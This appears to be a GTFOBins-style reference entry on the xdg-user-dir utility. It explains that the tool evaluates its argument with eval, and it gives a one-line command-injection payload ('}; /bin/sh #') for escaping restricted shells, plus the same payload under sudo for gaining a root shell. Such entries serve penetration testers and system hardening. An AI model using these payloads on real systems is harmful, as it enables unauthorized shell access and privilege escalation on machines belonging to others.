# GTFOBin: xdg-user-dir

The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
xdg-user-dir '}; /bin/sh #'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo xdg-user-dir '}; /bin/sh #'
```